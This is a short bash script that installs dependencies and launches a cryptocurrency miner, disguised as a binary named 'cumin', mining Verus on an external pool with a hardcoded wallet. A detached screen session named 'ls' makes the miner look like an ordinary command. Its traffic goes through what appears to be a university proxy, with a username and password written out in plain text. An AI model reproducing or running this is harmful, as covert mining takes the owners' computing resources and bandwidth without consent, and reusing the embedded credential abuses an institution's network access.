#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RTYdzcR1YraQQXz2MsKfMyTbDb35MY2x3G
WORKER=$(echo $(shuf -i 1-1 -n 1)-SHE)
PROXY=http://ITS-569301-a1c06:a044b@proxy.its.ac.id:8080
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
